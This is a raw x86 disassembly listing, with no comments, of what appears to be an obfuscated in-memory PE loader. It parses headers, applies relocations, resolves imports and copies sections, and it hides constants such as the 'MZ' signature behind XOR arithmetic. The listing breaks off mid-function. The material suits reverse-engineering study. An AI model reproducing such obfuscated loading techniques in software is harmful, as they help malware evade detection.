  4264df:	lea    ecx,[eax+0x14]
  4264e2:	push   ebx
  4264e3:	mov    DWORD PTR [ebp-0x18],ecx
  4264e6:	mov    esi,0x7fffffff
  4264eb:	push   edi
  4264ec:	test   DWORD PTR [ecx],esi
  4264ee:	je     0x42656f
  4264f0:	mov    edx,DWORD PTR [ecx]
  4264f2:	and    DWORD PTR [ebp-0xc],0x0
  4264f6:	and    edx,esi
  4264f8:	add    edx,eax
  4264fa:	movzx  edi,WORD PTR [edx+0xe]
  4264fe:	movzx  ebx,WORD PTR [edx+0xc]
  426502:	add    edi,ebx
  426504:	je     0x42656f
  426506:	lea    ecx,[edx+0x14]
  426509:	mov    DWORD PTR [ebp-0x14],ecx
  42650c:	test   DWORD PTR [ecx],esi
  42650e:	je     0x426551
  426510:	mov    ecx,DWORD PTR [ecx]
  426512:	and    DWORD PTR [ebp-0x8],0x0
  426516:	and    ecx,esi
  426518:	add    ecx,eax
  42651a:	movzx  edi,WORD PTR [ecx+0xe]
  42651e:	movzx  ebx,WORD PTR [ecx+0xc]
  426522:	add    edi,ebx
  426524:	je     0x426551
  426526:	lea    edi,[ecx+0x14]
  426529:	mov    DWORD PTR [ebp-0x4],edi
  42652c:	mov    edi,DWORD PTR [ebp-0x4]
  42652f:	mov    edi,DWORD PTR [edi]
  426531:	test   edi,edi
  426533:	je     0x42653b
  426535:	mov    ebx,DWORD PTR [ebp-0x1c]
  426538:	add    DWORD PTR [edi+eax*1],ebx
  42653b:	movzx  edi,WORD PTR [ecx+0xe]
  42653f:	movzx  ebx,WORD PTR [ecx+0xc]
  426543:	inc    DWORD PTR [ebp-0x8]
  426546:	add    DWORD PTR [ebp-0x4],0x8
  42654a:	add    edi,ebx
  42654c:	cmp    DWORD PTR [ebp-0x8],edi
  42654f:	jb     0x42652c
  426551:	movzx  edi,WORD PTR [edx+0xe]
  426555:	movzx  ebx,WORD PTR [edx+0xc]
  426559:	mov    ecx,DWORD PTR [ebp-0x14]
  42655c:	inc    DWORD PTR [ebp-0xc]
  42655f:	add    ecx,0x8
  426562:	add    edi,ebx
  426564:	mov    DWORD PTR [ebp-0x14],ecx
  426567:	cmp    DWORD PTR [ebp-0xc],edi
  42656a:	jb     0x42650c
  42656c:	mov    ecx,DWORD PTR [ebp-0x18]
  42656f:	movzx  edx,WORD PTR [eax+0xe]
  426573:	movzx  edi,WORD PTR [eax+0xc]
  426577:	inc    DWORD PTR [ebp-0x10]
  42657a:	add    ecx,0x8
  42657d:	add    edx,edi
  42657f:	mov    DWORD PTR [ebp-0x18],ecx
  426582:	cmp    DWORD PTR [ebp-0x10],edx
  426585:	jb     0x4264ec
  42658b:	pop    edi
  42658c:	pop    ebx
  42658d:	xor    eax,eax
  42658f:	inc    eax
  426590:	jmp    0x426594
  426592:	xor    eax,eax
  426594:	pop    esi
  426595:	leave  
  426596:	ret    
  426597:	push   ebp
  426598:	mov    ebp,esp
  42659a:	mov    ecx,DWORD PTR [ecx+0x190]
  4265a0:	mov    eax,DWORD PTR [ebp+0xc]
  4265a3:	sub    esp,0x10
  4265a6:	push   ebx
  4265a7:	xor    ebx,ebx
  4265a9:	push   esi
  4265aa:	push   edi
  4265ab:	cmp    DWORD PTR [ecx],ebx
  4265ad:	je     0x426635
  4265b3:	cmp    eax,ebx
  4265b5:	je     0x426635
  4265b7:	cmp    DWORD PTR [eax+0x78],ebx
  4265ba:	jne    0x4265c1
  4265bc:	xor    eax,eax
  4265be:	inc    eax
  4265bf:	jmp    0x426637
  4265c1:	mov    eax,DWORD PTR [eax+0x78]
  4265c4:	add    eax,DWORD PTR [ebp+0x8]
  4265c7:	mov    ecx,DWORD PTR [eax+0x1c]
  4265ca:	mov    edx,DWORD PTR [eax+0x24]
  4265cd:	mov    esi,DWORD PTR [eax+0x14]
  4265d0:	mov    edi,DWORD PTR [eax+0x18]
  4265d3:	add    ecx,DWORD PTR [ebp+0x8]
  4265d6:	add    edx,DWORD PTR [ebp+0x8]
  4265d9:	mov    DWORD PTR [ebp-0x4],esi
  4265dc:	cmp    esi,edi
  4265de:	ja     0x4265e3
  4265e0:	mov    DWORD PTR [ebp-0x4],edi
  4265e3:	mov    DWORD PTR [ebp-0x8],ebx
  4265e6:	cmp    DWORD PTR [ebp-0x4],ebx
  4265e9:	jbe    0x4265bc
  4265eb:	cmp    ebx,DWORD PTR [eax+0x14]
  4265ee:	jae    0x4265f6
  4265f0:	movzx  esi,WORD PTR [edx+ebx*2]
  4265f4:	jmp    0x4265f8
  4265f6:	mov    esi,ebx
  4265f8:	lea    esi,[ecx+esi*4]
  4265fb:	mov    edi,DWORD PTR [esi]
  4265fd:	test   edi,edi
  4265ff:	je     0x42662a
  426601:	add    edi,DWORD PTR [ebp+0x8]
  426604:	mov    DWORD PTR [ebp-0x10],edi
  426607:	cmp    edi,eax
  426609:	jbe    0x42661b
  42660b:	mov    ebx,DWORD PTR [ebp+0xc]
  42660e:	mov    ebx,DWORD PTR [ebx+0x7c]
  426611:	add    ebx,eax
  426613:	cmp    edi,ebx
  426615:	jae    0x42661b
  426617:	mov    esi,DWORD PTR [esi]
  426619:	jmp    0x426623
  42661b:	sub    edi,DWORD PTR [ebp+0x8]
  42661e:	mov    DWORD PTR [esi],edi
  426620:	mov    esi,DWORD PTR [ebp-0x10]
  426623:	test   esi,esi
  426625:	je     0x426635
  426627:	mov    ebx,DWORD PTR [ebp-0x8]
  42662a:	inc    ebx
  42662b:	mov    DWORD PTR [ebp-0x8],ebx
  42662e:	cmp    ebx,DWORD PTR [ebp-0x4]
  426631:	jb     0x4265eb
  426633:	jmp    0x4265bc
  426635:	xor    eax,eax
  426637:	pop    edi
  426638:	pop    esi
  426639:	pop    ebx
  42663a:	leave  
  42663b:	ret    0x8
  42663e:	push   ebp
  42663f:	mov    ebp,esp
  426641:	sub    esp,0x2c
  426644:	mov    edx,0xf89c85b9
  426649:	mov    DWORD PTR [ebp-0x4],edx
  42664c:	mov    DWORD PTR [ebp-0x8],0xf89c85b8
  426653:	mov    eax,DWORD PTR [ebp-0x4]
  426656:	mov    ecx,DWORD PTR [ebp-0x4]
  426659:	mov    ecx,DWORD PTR [ebp-0x4]
  42665c:	mov    ecx,DWORD PTR [ebp-0x4]
  42665f:	mov    ecx,DWORD PTR [ebp-0x4]
  426662:	mov    ecx,DWORD PTR [ebp-0x4]
  426665:	push   ebx
  426666:	mov    ebx,DWORD PTR [ebp+0x10]
  426669:	push   esi
  42666a:	mov    esi,0x7510899
  42666f:	mov    DWORD PTR [ebp-0x10],0x352eb0f
  426676:	mov    ecx,DWORD PTR [ebp-0x4]
  426679:	mov    ebx,DWORD PTR [ebx+0x190]
  42667f:	push   edi
  426680:	mov    edi,0x3272e0
  426685:	xor    ecx,esi
  426687:	xor    eax,esi
  426689:	add    eax,edi
  42668b:	add    ecx,edi
  42668d:	mov    DWORD PTR [ebp-0x18],eax
  426690:	cmp    ecx,DWORD PTR [ebx]
  426692:	je     0x426913
  426698:	mov    ebx,DWORD PTR [ebp-0x4]
  42669b:	mov    ecx,DWORD PTR [ebp+0xc]
  42669e:	xor    ebx,esi
  4266a0:	add    ebx,edi
  4266a2:	cmp    ebx,ecx
  4266a4:	je     0x426913
  4266aa:	mov    ebx,DWORD PTR [ebp-0x4]
  4266ad:	mov    ecx,DWORD PTR [ecx+0x80]
  4266b3:	xor    ebx,esi
  4266b5:	add    ebx,edi
  4266b7:	cmp    ecx,ebx
  4266b9:	je     0x42690e
  4266bf:	add    ecx,DWORD PTR [ebp+0x8]
  4266c2:	mov    DWORD PTR [ebp-0x2c],ecx
  4266c5:	mov    ebx,edx
  4266c7:	xor    ebx,esi
  4266c9:	add    ebx,edi
  4266cb:	mov    DWORD PTR [ebp-0x10],ebx
  4266ce:	mov    ebx,DWORD PTR [ebp-0x10]
  4266d1:	cmp    ebx,edx
  4266d3:	je     0x4266e7
  4266d5:	mov    edx,DWORD PTR [ebp-0x10]
  4266d8:	mov    ebx,DWORD PTR [ebp-0x4]
  4266db:	imul   edx,edx,0x14
  4266de:	xor    ebx,esi
  4266e0:	add    ebx,edi
  4266e2:	cmp    DWORD PTR [edx+ecx*1],ebx
  4266e5:	jne    0x4266fe
  4266e7:	mov    edx,DWORD PTR [ebp-0x10]
  4266ea:	mov    ebx,DWORD PTR [ebp-0x4]
  4266ed:	imul   edx,edx,0x14
  4266f0:	xor    ebx,esi
  4266f2:	add    ebx,edi
  4266f4:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  4266f8:	je     0x426900
  4266fe:	mov    eax,DWORD PTR [ebp-0x4]
  426701:	mov    ebx,DWORD PTR [ebp-0x4]
  426704:	mov    eax,DWORD PTR [ebp-0x10]
  426707:	imul   eax,eax,0x14
  42670a:	add    eax,ecx
  42670c:	mov    ecx,DWORD PTR [eax+0x10]
  42670f:	add    ecx,DWORD PTR [ebp+0x8]
  426712:	xor    ebx,esi
  426714:	mov    DWORD PTR [ebp-0x1c],ecx
  426717:	mov    ecx,DWORD PTR [ebp-0x4]
  42671a:	mov    edx,DWORD PTR [ebp-0x4]
  42671d:	xor    ecx,esi
  42671f:	add    ecx,edi
  426721:	xor    edx,esi
  426723:	mov    DWORD PTR [ebp-0x24],ecx
  426726:	mov    ecx,DWORD PTR [eax]
  426728:	add    edx,edi
  42672a:	add    ebx,edi
  42672c:	cmp    ecx,edx
  42672e:	je     0x426736
  426730:	add    ecx,DWORD PTR [ebp+0x8]
  426733:	mov    DWORD PTR [ebp-0x24],ecx
  426736:	mov    ecx,DWORD PTR [ebp-0x4]
  426739:	xor    ecx,esi
  42673b:	add    ecx,DWORD PTR [eax+0xc]
  42673e:	mov    eax,DWORD PTR [ebp+0x8]
  426741:	lea    eax,[ecx+eax*1+0x3272e0]
  426748:	mov    DWORD PTR [ebp+0xc],eax
  42674b:	mov    DWORD PTR [ebp-0x28],0xf89c85bc
  426752:	mov    eax,DWORD PTR [ebp+0x10]
  426755:	push   DWORD PTR [ebp+0xc]
  426758:	mov    eax,DWORD PTR [eax+0x1d8]
  42675e:	call   DWORD PTR [eax]
  426760:	mov    ecx,DWORD PTR [ebp-0x4]
  426763:	xor    ecx,esi
  426765:	add    ecx,edi
  426767:	mov    DWORD PTR [ebp-0xc],eax
  42676a:	cmp    ecx,eax
  42676c:	jne    0x426780
  42676e:	mov    eax,DWORD PTR [ebp+0x10]
  426771:	push   DWORD PTR [ebp+0xc]
  426774:	mov    eax,DWORD PTR [eax+0x1d8]
  42677a:	call   DWORD PTR [eax+0xc]
  42677d:	mov    DWORD PTR [ebp-0xc],eax
  426780:	mov    DWORD PTR [ebp-0x20],0x7f661b00
  426787:	mov    DWORD PTR [ebp-0x20],0xf89c9990
  42678e:	mov    eax,DWORD PTR [ebp-0x4]
  426791:	xor    eax,esi
  426793:	add    eax,edi
  426795:	cmp    eax,DWORD PTR [ebp-0xc]
  426798:	jne    0x4267bd
  42679a:	mov    eax,DWORD PTR [ebp-0x8]
  42679d:	mov    ecx,DWORD PTR [ebp-0x20]
  4267a0:	xor    eax,esi
  4267a2:	xor    ecx,esi
  4267a4:	lea    ebx,[ebx+eax*1+0x3272e0]
  4267ab:	mov    eax,DWORD PTR [ebp+0x10]
  4267ae:	mov    eax,DWORD PTR [eax+0x1d8]
  4267b4:	add    ecx,edi
  4267b6:	imul   ecx,ebx
  4267b9:	push   ecx
  4267ba:	call   DWORD PTR [eax+0x24]
  4267bd:	mov    eax,DWORD PTR [ebp-0x4]
  4267c0:	xor    eax,esi
  4267c2:	add    eax,edi
  4267c4:	cmp    eax,DWORD PTR [ebp-0xc]
  4267c7:	jne    0x4267d8
  4267c9:	mov    eax,DWORD PTR [ebp-0x28]
  4267cc:	xor    eax,esi
  4267ce:	add    eax,edi
  4267d0:	cmp    ebx,eax
  4267d2:	jbe    0x426752
  4267d8:	mov    eax,DWORD PTR [ebp-0x4]
  4267db:	xor    eax,esi
  4267dd:	add    eax,edi
  4267df:	cmp    eax,DWORD PTR [ebp-0xc]
  4267e2:	jne    0x4267fb
  4267e4:	mov    eax,DWORD PTR [ebp-0x8]
  4267e7:	mov    ecx,DWORD PTR [ebp-0x18]
  4267ea:	xor    eax,esi
  4267ec:	lea    eax,[ecx+eax*1+0x3272e0]
  4267f3:	mov    DWORD PTR [ebp-0x18],eax
  4267f6:	jmp    0x4268ea
  4267fb:	mov    DWORD PTR [ebp-0x14],0x1121b01
  426802:	mov    DWORD PTR [ebp+0xc],0xe042d0f
  426809:	mov    ebx,DWORD PTR [ebp-0x4]
  42680c:	xor    ebx,esi
  42680e:	add    ebx,edi
  426810:	jmp    0x4268d7
  426815:	mov    eax,DWORD PTR [ebp-0x4]
  426818:	xor    eax,esi
  42681a:	add    eax,edi
  42681c:	mov    DWORD PTR [ebp-0x14],eax
  42681f:	mov    eax,DWORD PTR [ebp-0x4]
  426822:	xor    eax,esi
  426824:	add    eax,edi
  426826:	mov    DWORD PTR [ebp+0xc],eax
  426829:	mov    ecx,DWORD PTR [ebp-0x4]
  42682c:	mov    eax,DWORD PTR [ebp-0x24]
  42682f:	xor    ecx,esi
  426831:	add    ecx,edi
  426833:	cmp    ecx,eax
  426835:	je     0x42683d
  426837:	mov    eax,DWORD PTR [eax+ebx*4]
  42683a:	mov    DWORD PTR [ebp-0x14],eax
  42683d:	mov    eax,DWORD PTR [ebp-0x1c]
  426840:	mov    eax,DWORD PTR [eax+ebx*4]
  426843:	mov    DWORD PTR [ebp+0xc],eax
  426846:	mov    eax,DWORD PTR [ebp-0x4]
  426849:	mov    ecx,DWORD PTR [ebp-0x14]
  42684c:	xor    eax,esi
  42684e:	add    eax,edi
  426850:	cmp    eax,ecx
  426852:	je     0x42687d
  426854:	mov    eax,DWORD PTR [ebp-0x4]
  426857:	mov    ecx,DWORD PTR [ebp-0x14]
  42685a:	xor    eax,esi
  42685c:	add    eax,edi
  42685e:	shr    ecx,0x1f
  426861:	cmp    eax,ecx
  426863:	je     0x42687d
  426865:	mov    ecx,DWORD PTR [ebp-0x14]
  426868:	mov    eax,DWORD PTR [ebp+0x10]
  42686b:	mov    eax,DWORD PTR [eax+0x1d8]
  426871:	movzx  ecx,cx
  426874:	push   ecx
  426875:	push   DWORD PTR [ebp-0xc]
  426878:	call   DWORD PTR [eax+0x8]
  42687b:	jmp    0x426896
  42687d:	mov    eax,DWORD PTR [ebp+0xc]
  426880:	add    eax,DWORD PTR [ebp+0x8]
  426883:	mov    ecx,DWORD PTR [ebp+0x10]
  426886:	mov    ecx,DWORD PTR [ecx+0x1d8]
  42688c:	add    eax,0x2
  42688f:	push   eax
  426890:	push   DWORD PTR [ebp-0xc]
  426893:	call   DWORD PTR [ecx+0x8]
  426896:	mov    DWORD PTR [ebp+0xc],eax
  426899:	mov    eax,DWORD PTR [ebp-0x4]
  42689c:	mov    ecx,DWORD PTR [ebp+0xc]
  42689f:	xor    eax,esi
  4268a1:	add    eax,edi
  4268a3:	cmp    eax,ecx
  4268a5:	mov    eax,DWORD PTR [ebp-0x8]
  4268a8:	jne    0x4268bb
  4268aa:	mov    ecx,DWORD PTR [ebp-0x18]
  4268ad:	xor    eax,esi
  4268af:	lea    eax,[ecx+eax*1+0x3272e0]
  4268b6:	mov    DWORD PTR [ebp-0x18],eax
  4268b9:	jmp    0x4268cb
  4268bb:	mov    ecx,DWORD PTR [ebp+0xc]
  4268be:	xor    eax,esi
  4268c0:	add    eax,edi
  4268c2:	imul   eax,ecx
  4268c5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268c8:	mov    DWORD PTR [ecx+ebx*4],eax
  4268cb:	mov    eax,DWORD PTR [ebp-0x8]
  4268ce:	xor    eax,esi
  4268d0:	lea    ebx,[ebx+eax*1+0x3272e0]
  4268d7:	mov    eax,DWORD PTR [ebp-0x4]
  4268da:	mov    ecx,DWORD PTR [ebp-0x1c]
  4268dd:	xor    eax,esi
  4268df:	add    eax,edi
  4268e1:	cmp    DWORD PTR [ecx+ebx*4],eax
  4268e4:	jne    0x426815
  4268ea:	mov    edx,DWORD PTR [ebp-0x10]
  4268ed:	mov    eax,DWORD PTR [ebp-0x18]
  4268f0:	mov    ecx,DWORD PTR [ebp-0x2c]
  4268f3:	sub    edx,0x3272df
  4268f9:	xor    edx,esi
  4268fb:	jmp    0x4266c5
  426900:	mov    ecx,DWORD PTR [ebp-0x4]
  426903:	xor    ecx,esi
  426905:	add    ecx,edi
  426907:	cmp    eax,ecx
  426909:	mov    eax,DWORD PTR [ebp-0x4]
  42690c:	jne    0x426916
  42690e:	mov    eax,DWORD PTR [ebp-0x8]
  426911:	jmp    0x426916
  426913:	mov    eax,DWORD PTR [ebp-0x4]
  426916:	xor    eax,esi
  426918:	add    eax,edi
  42691a:	pop    edi
  42691b:	pop    esi
  42691c:	pop    ebx
  42691d:	leave  
  42691e:	ret    0xc
  426921:	push   ebp
  426922:	mov    ebp,esp
  426924:	sub    esp,0x28
  426927:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  42692e:	mov    DWORD PTR [ebp-0x28],0xf89c85b8
  426935:	mov    eax,DWORD PTR [ebp+0xc]
  426938:	mov    DWORD PTR [ebp+0xc],eax
  42693b:	push   esi
  42693c:	mov    eax,eax
  42693e:	mov    eax,DWORD PTR [ebp-0x4]
  426941:	mov    esi,DWORD PTR [ebp+0x8]
  426944:	mov    ecx,0x7510899
  426949:	xor    eax,ecx
  42694b:	mov    edx,0x3272e0
  426950:	add    eax,edx
  426952:	cmp    esi,eax
  426954:	je     0x426a7b
  42695a:	mov    eax,DWORD PTR [ebp+0x8]
  42695d:	mov    esi,DWORD PTR [ebp+0x8]
  426960:	add    esi,DWORD PTR [eax+0x3c]
  426963:	push   edi
  426964:	mov    DWORD PTR [ebp+0xc],esi
  426967:	mov    DWORD PTR [ebp-0x1c],0xf89c85bc
  42696e:	mov    eax,DWORD PTR [ebp-0x1c]
  426971:	mov    esi,DWORD PTR [ebp-0x4]
  426974:	mov    edi,DWORD PTR [ebp+0xc]
  426977:	xor    esi,ecx
  426979:	xor    eax,ecx
  42697b:	add    esi,edx
  42697d:	cmp    DWORD PTR [edi+eax*8+0x1939778],esi
  426984:	je     0x426a75
  42698a:	mov    esi,DWORD PTR [ebp+0xc]
  42698d:	mov    eax,DWORD PTR [ebp+0x8]
  426990:	add    eax,DWORD PTR [esi+0xa0]
  426996:	mov    esi,DWORD PTR [ebp+0x8]
  426999:	mov    edi,DWORD PTR [ebp+0xc]
  42699c:	sub    esi,DWORD PTR [edi+0x34]
  42699f:	mov    edi,DWORD PTR [ebp-0x4]
  4269a2:	xor    edi,ecx
  4269a4:	add    edi,edx
  4269a6:	mov    DWORD PTR [ebp-0x24],esi
  4269a9:	cmp    esi,edi
  4269ab:	je     0x426a75
  4269b1:	mov    esi,DWORD PTR [ebp-0x4]
  4269b4:	xor    esi,ecx
  4269b6:	add    esi,edx
  4269b8:	mov    DWORD PTR [ebp-0x8],esi
  4269bb:	push   ebx
  4269bc:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  4269c3:	jmp    0x426a5f
  4269c8:	mov    esi,DWORD PTR [ebp-0x4]
  4269cb:	xor    esi,ecx
  4269cd:	lea    edi,[ebx-0x8]
  4269d0:	add    esi,edx
  4269d2:	shr    edi,1
  4269d4:	cmp    esi,edi
  4269d6:	jae    0x426a45
  4269d8:	sub    edi,esi
  4269da:	lea    ebx,[eax+esi*2+0x8]
  4269de:	mov    DWORD PTR [ebp-0x18],edi
  4269e1:	movzx  esi,WORD PTR [ebx]
  4269e4:	and    esi,0xfff
  4269ea:	mov    DWORD PTR [ebp-0x14],esi
  4269ed:	mov    edi,DWORD PTR [ebp-0x14]
  4269f0:	mov    esi,DWORD PTR [eax]
  4269f2:	sub    esi,edx
  4269f4:	add    edi,esi
  4269f6:	movzx  esi,WORD PTR [ebx]
  4269f9:	shr    esi,0xc
  4269fc:	xor    edi,ecx
  4269fe:	mov    DWORD PTR [ebp-0x20],edi
  426a01:	mov    DWORD PTR [ebp-0x14],esi
  426a04:	mov    esi,DWORD PTR [ebp-0x20]
  426a07:	mov    edi,DWORD PTR [ebp+0x8]
  426a0a:	xor    esi,ecx
  426a0c:	lea    esi,[esi+edi*1+0x3272e0]
  426a13:	mov    DWORD PTR [ebp-0x20],esi
  426a16:	mov    esi,DWORD PTR [ebp-0x10]
  426a19:	mov    edi,DWORD PTR [ebp-0x14]
  426a1c:	xor    esi,ecx
  426a1e:	add    esi,edx
  426a20:	cmp    edi,esi
  426a22:	jne    0x426a3a
  426a24:	mov    esi,DWORD PTR [ebp-0x10]
  426a27:	mov    edi,DWORD PTR [ebp-0x14]
  426a2a:	xor    esi,ecx
  426a2c:	add    esi,edx
  426a2e:	cmp    edi,esi
  426a30:	jne    0x426a3a
  426a32:	mov    esi,DWORD PTR [ebp-0x20]
  426a35:	mov    edi,DWORD PTR [ebp-0x24]
  426a38:	add    DWORD PTR [esi],edi
  426a3a:	add    ebx,0x2
  426a3d:	dec    DWORD PTR [ebp-0x18]
  426a40:	jne    0x4269e1
  426a42:	mov    ebx,DWORD PTR [ebp-0xc]
  426a45:	add    DWORD PTR [ebp-0x8],ebx
  426a48:	mov    esi,DWORD PTR [ebp-0x1c]
  426a4b:	mov    edi,DWORD PTR [ebp-0x8]
  426a4e:	mov    ebx,DWORD PTR [ebp+0xc]
  426a51:	xor    esi,ecx
  426a53:	cmp    edi,DWORD PTR [ebx+esi*8+0x193977c]
  426a5a:	jae    0x426a74
  426a5c:	add    eax,DWORD PTR [ebp-0xc]
  426a5f:	mov    esi,DWORD PTR [ebp-0x4]
  426a62:	mov    ebx,DWORD PTR [eax+0x4]
  426a65:	xor    esi,ecx
  426a67:	add    esi,edx
  426a69:	mov    DWORD PTR [ebp-0xc],ebx
  426a6c:	cmp    ebx,esi
  426a6e:	jne    0x4269c8
  426a74:	pop    ebx
  426a75:	mov    eax,DWORD PTR [ebp-0x28]
  426a78:	pop    edi
  426a79:	jmp    0x426a7e
  426a7b:	mov    eax,DWORD PTR [ebp-0x4]
  426a7e:	xor    eax,ecx
  426a80:	add    eax,edx
  426a82:	pop    esi
  426a83:	leave  
  426a84:	ret    0x8
  426a87:	push   ebp
  426a88:	mov    ebp,esp
  426a8a:	sub    esp,0x54
  426a8d:	mov    DWORD PTR [ebp-0x4],0xf89c85b9
  426a94:	mov    DWORD PTR [ebp-0x24],0xf89c85b8
  426a9b:	mov    eax,DWORD PTR [ebp-0x4]
  426a9e:	push   ebx
  426a9f:	push   esi
  426aa0:	mov    esi,0x7510899
  426aa5:	xor    eax,esi
  426aa7:	mov    ebx,0x3272e0
  426aac:	add    eax,ebx
  426aae:	mov    DWORD PTR [ebp-0x18],eax
  426ab1:	mov    eax,DWORD PTR [ebp-0x4]
  426ab4:	xor    eax,esi
  426ab6:	add    eax,ebx
  426ab8:	mov    DWORD PTR [ebp-0x20],eax
  426abb:	push   edi
  426abc:	mov    edi,DWORD PTR [ebp+0x20]
  426abf:	mov    eax,DWORD PTR [ebp-0x10]
  426ac2:	mov    ecx,DWORD PTR [ebp-0x10]
  426ac5:	xor    eax,ecx
  426ac7:	mov    DWORD PTR [ebp-0x10],eax
  426aca:	add    DWORD PTR [ebp-0x10],0xf89cb5b9
  426ad1:	mov    eax,DWORD PTR [ebp-0x8]
  426ad4:	mov    ecx,DWORD PTR [ebp-0x8]
  426ad7:	xor    eax,ecx
  426ad9:	mov    DWORD PTR [ebp-0x8],eax
  426adc:	add    DWORD PTR [ebp-0x8],0xf89c85f9
  426ae3:	mov    eax,DWORD PTR [ebp-0xc]
  426ae6:	mov    ecx,DWORD PTR [ebp-0xc]
  426ae9:	xor    eax,ecx
  426aeb:	mov    DWORD PTR [ebp-0xc],eax
  426aee:	add    DWORD PTR [ebp-0xc],0xf89c85bd
  426af5:	mov    eax,DWORD PTR [ebp-0x14]
  426af8:	mov    ecx,DWORD PTR [ebp-0x14]
  426afb:	xor    eax,ecx
  426afd:	mov    DWORD PTR [ebp-0x14],eax
  426b00:	add    DWORD PTR [ebp-0x14],0xf89f05b9
  426b07:	mov    eax,0x9471
  426b0c:	mov    WORD PTR [ebp+0x20],ax
  426b10:	mov    eax,DWORD PTR [ebp+0x8]
  426b13:	test   eax,eax
  426b15:	je     0x426efa
  426b1b:	mov    eax,DWORD PTR [ebp+0xc]
  426b1e:	test   eax,eax
  426b20:	je     0x426efa
  426b26:	mov    eax,DWORD PTR [ebp+0x18]
  426b29:	test   eax,eax
  426b2b:	je     0x426efa
  426b31:	mov    ax,WORD PTR [ebp+0x20]
  426b35:	mov    ecx,0x8a8c
  426b3a:	xor    ax,cx
  426b3d:	mov    ecx,0x3b50
  426b42:	add    ax,cx
  426b45:	mov    ecx,DWORD PTR [ebp+0x8]
  426b48:	cmp    WORD PTR [ecx],ax
  426b4b:	jne    0x426efa
  426b51:	mov    eax,DWORD PTR [ebp-0x4]
  426b54:	mov    ecx,DWORD PTR [ebp+0x8]
  426b57:	mov    eax,DWORD PTR [ebp+0x8]
  426b5a:	add    eax,DWORD PTR [ecx+0x3c]
  426b5d:	mov    DWORD PTR [ebp+0xc],eax
  426b60:	mov    eax,DWORD PTR [eax+0x50]
  426b63:	test   eax,eax
  426b65:	je     0x426efa
  426b6b:	mov    DWORD PTR [ebp-0x2c],0xf88c85b9
  426b72:	mov    eax,DWORD PTR [ebp-0x2c]
  426b75:	xor    eax,esi
  426b77:	add    eax,ebx
  426b79:	mov    DWORD PTR [ebp-0x2c],eax
  426b7c:	mov    eax,DWORD PTR [ebp-0x4]
  426b7f:	mov    eax,DWORD PTR [edi+0x190]
  426b85:	mov    ecx,DWORD PTR [eax]
  426b87:	mov    ecx,DWORD PTR [ecx+0x3c]
  426b8a:	add    ecx,DWORD PTR [eax]
  426b8c:	mov    eax,DWORD PTR [ebp-0x4]
  426b8f:	mov    eax,DWORD PTR [edi+0x18c]
  426b95:	mov    edx,DWORD PTR [eax]
  426b97:	mov    DWORD PTR [ebp-0x1c],ecx
  426b9a:	mov    DWORD PTR [ebp+0x20],edx
  426b9d:	cmp    edx,edx
  426b9f:	jne    0x426bd4
  426ba1:	mov    eax,DWORD PTR [edi+0x1d8]
  426ba7:	lea    edx,[ebp-0x18]
  426baa:	push   edx
  426bab:	mov    edx,DWORD PTR [ebp-0x8]
  426bae:	xor    edx,esi
  426bb0:	add    edx,ebx
  426bb2:	push   edx
  426bb3:	push   DWORD PTR [ecx+0x50]
  426bb6:	push   DWORD PTR [ebp+0x20]
  426bb9:	call   DWORD PTR [eax+0x1c]
  426bbc:	mov    ecx,DWORD PTR [ebp-0x1c]
  426bbf:	mov    eax,DWORD PTR [ecx+0x54]
  426bc2:	mov    ecx,DWORD PTR [ecx+0x50]
  426bc5:	sub    ecx,eax
  426bc7:	add    eax,DWORD PTR [ebp+0x20]
  426bca:	push   ecx
  426bcb:	push   eax
  426bcc:	call   0x42750e
  426bd1:	mov    edx,DWORD PTR [ebp+0x20]
  426bd4:	mov    eax,DWORD PTR [edi+0x194]
  426bda:	mov    DWORD PTR [eax],edx
  426bdc:	mov    eax,DWORD PTR [ebp+0xc]
  426bdf:	push   DWORD PTR [eax+0x54]
  426be2:	push   DWORD PTR [ebp+0x8]
  426be5:	push   edx
  426be6:	call   0x4273b5
  426beb:	mov    ecx,DWORD PTR [ebp+0x20]
  426bee:	mov    eax,DWORD PTR [ecx+0x3c]
  426bf1:	add    eax,ecx
  426bf3:	movzx  ecx,WORD PTR [eax+0x14]
  426bf7:	lea    ecx,[ecx+eax*1+0x18]
  426bfb:	mov    DWORD PTR [ebp+0x18],ecx
  426bfe:	mov    ecx,DWORD PTR [ebp-0x4]
  426c01:	movzx  edx,WORD PTR [eax+0x6]
  426c05:	xor    ecx,esi
  426c07:	add    ecx,ebx
  426c09:	mov    DWORD PTR [ebp+0xc],eax
  426c0c:	cmp    edx,ecx
  426c0e:	je     0x426cbc
  426c14:	mov    ecx,DWORD PTR [ebp-0x4]
  426c17:	xor    ecx,esi
  426c19:	add    ecx,ebx
  426c1b:	mov    DWORD PTR [ebp-0x20],ecx
  426c1e:	mov    ecx,DWORD PTR [ebp-0x24]
  426c21:	movzx  edx,WORD PTR [eax+0x6]
  426c25:	xor    ecx,esi
  426c27:	sub    edx,ecx
  426c29:	sub    edx,ebx
  426c2b:	cmp    DWORD PTR [ebp-0x20],edx
  426c2e:	ja     0x426cbc
  426c34:	mov    edx,DWORD PTR [ebp+0x18]
  426c37:	add    edx,0x8
  426c3a:	mov    DWORD PTR [ebp+0x18],edx
  426c3d:	jmp    0x426c42
  426c3f:	mov    edx,DWORD PTR [ebp+0x18]
  426c42:	mov    eax,DWORD PTR [eax+0x38]
  426c45:	lea    ecx,[eax-0x1]
  426c48:	mov    DWORD PTR [ebp-0x30],eax
  426c4b:	mov    eax,DWORD PTR [edx]
  426c4d:	test   ecx,eax
  426c4f:	je     0x426c58
  426c51:	not    ecx
  426c53:	and    eax,ecx
  426c55:	add    eax,DWORD PTR [ebp-0x30]
  426c58:	push   eax
  426c59:	mov    eax,DWORD PTR [edx+0x4]
  426c5c:	add    eax,DWORD PTR [ebp+0x20]
  426c5f:	push   eax
  426c60:	call   0x42750e
  426c65:	mov    edx,DWORD PTR [ebp-0x4]
  426c68:	mov    eax,DWORD PTR [ebp+0x18]
  426c6b:	mov    ecx,DWORD PTR [eax+0x8]
  426c6e:	xor    edx,esi
  426c70:	add    edx,ebx
  426c72:	cmp    ecx,edx
  426c74:	je     0x426c8d
  426c76:	push   ecx
  426c77:	mov    ecx,DWORD PTR [ebp+0x8]
  426c7a:	add    ecx,DWORD PTR [eax+0xc]
  426c7d:	mov    eax,DWORD PTR [eax+0x4]
  426c80:	add    eax,DWORD PTR [ebp+0x20]
  426c83:	push   ecx
  426c84:	push   eax
